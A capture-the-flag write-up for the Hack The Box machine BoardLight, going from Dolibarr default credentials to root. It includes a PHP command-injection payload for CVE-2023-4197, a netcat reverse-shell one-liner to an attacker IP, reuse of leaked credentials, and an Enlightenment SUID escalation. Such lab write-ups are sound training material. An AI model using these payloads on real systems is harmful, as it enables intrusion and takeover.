---
title: HTB-Boardlight
draft: false
tags:
  - htb
  - linux
  - easy
  - vhost
  - dolibarr
  - enlightment
  - suid
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/BoardLight.png)

## Information Gathering
### Rustscan

Rustscan find SSH and HTTP running on target:

`rustscan --addresses 10.10.11.11 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-1.png)

## Enumeration
### HTTP - TCP 80

The website shows nothing special:

>  BoardLight is a cybersecurity consulting firm specializing in providing cutting-edge security solutions to protect your business from cyber threats 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/bl1.png)

At the bottom of the page, there's domain **board.htb** found, which we add to `/etc/hosts`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-2.png)

Reading the source code, we can see there's a commented out part with: **portfolio.php**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-3.png)

However, nothing shows up when trying to access it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-4.png)

Let's see if there's other subdomains using gobuster:

`sudo gobuster vhost --append-domain -u http://board.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-7.png)

**crm.board.htb** is found. 

Let's add it to `/etc/hosts` as well. 

### crm.board.htb

The website is running on **Dolibarr 17.0.0** and shows a login portal:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-5.png)


Clicking on **Password Forgotten** will lead us to password regeneration page:

`http://crm.board.htb/user/passwordforgotten.php`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image.png)


Attempting some default credentials on login portal, **admin**:**admin** lets us bypass the portal:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-8.png)

Now that we are authenticated, let's see what can be done from here. 

Searching for the exploit relevant to the version, it seems like there are couple of them:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-6.png)


## Shell as www-data
### CVE-2023-4197

Let's try exploiting [CVE-2023-4197](https://nvd.nist.gov/vuln/detail/CVE-2023-4197):

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-9.png)

Using the [exploit code](https://starlabs.sg/advisories/23/23-4197/), let's see if we can successfully execute commands remotely:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-10.png)

Hmm, it seems like there's an minor error with the code execution part.


Let's make change to the exploit code to  ensure that full PHP tags `<?php ... ?>` are used instead of short tags `<? ... ?>`, which may not be enabled on all servers.

Below is the code before modification:

```php
"htmlheader": f"<? echo system('{cmd}'); ?>"
```

Below is the code after modification:

```php
"htmlheader": f"<?php echo system('{cmd}'); ?>"
```


After modifying the code, we can now successfully execute commands:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-11.png)

### Reverse Shell

Using the following payload, we will be able to spawn a reverse shell on netcat listener:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 1337 >/tmp/f`

We now have a shell as **www-data**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-12.png)

Let's first enhance the shell using Python:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-13.png)

## Privesc: www-data to larissa
### Local Enumeration

In order to fetch user flag, we would need to escalate our privilege to **larissa**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-21.png)

Enumerating around, it seems like there could be some juicy information inside below config files:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-18.png)

Inside **conf.php**, SQL credentials are found:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-19.png)

Let's try reusing the password above on SSH.

Luckily, we **larissa** was using the same password for mysql and we now have SSH connection:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-20.png)

## Privesc: Larissa to root
### Local Enumeration

Let's see what ports are open internally:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-23.png)

MySQL(3306) seems to be open. 

Let's access it using the credentials found earlier:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-22.png)

**dolibarr** database seems interesting:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-24.png)

From **llx_user** table, we can obtain password hashes:

`select * from llx_user;`

| login    | pass_crypted                                                 | lastname   |
|----------|--------------------------------------------------------------|------------|
| dolibarr | $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm | SuperAdmin |
| admin    | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 | admin      |

Unfortunately, discovered hashes were uncrackable.

### CVE-2022-37706

Let's take a look at SUID files:

`find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-25.png)

There are couple of SUID files that starts with **enlightment**, which we've never seen before:

Googling a bit on this, it seems like we would be able to exploit this SUID using **CVE-2022-37706**.

Using the exploit downloaded from [here](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit), we can easily get a shell as the root:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/boardlight/image-26.png)

## References
- https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit
- https://starlabs.sg/advisories/23/23-4197/